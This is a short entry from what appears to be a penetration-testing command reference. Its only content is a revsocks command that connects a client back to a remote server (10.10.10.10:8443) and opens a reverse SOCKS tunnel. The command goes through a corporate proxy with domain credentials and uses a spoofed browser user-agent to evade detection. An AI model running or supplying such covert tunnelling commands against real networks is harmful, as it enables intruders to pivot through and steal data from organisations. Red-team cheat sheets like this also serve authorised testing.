---
id: a0e7d4ca-6186-4ca2-bc7c-2bfb4438591d
name: Connect client to the server with proxy
type: command
executor: bash
data: user@PC$ ./revsocks -connect 10.10.10.10:8443 -pass Password1234 -proxy proxy.domain.local:3128
  -proxyauth Domain/userpame:userpass -useragent "Mozilla 5.0/IE Windows 10"
output: null
created_at: '2023-04-06T03:56:22.907226+00:00'
updated_at: '2023-04-10T20:25:18.397562+00:00'
---

# Connect client to the server with proxy

```bash
user@PC$ ./revsocks -connect 10.10.10.10:8443 -pass Password1234 -proxy proxy.domain.local:3128 -proxyauth Domain/userpame:userpass -useragent "Mozilla 5.0/IE Windows 10"
```


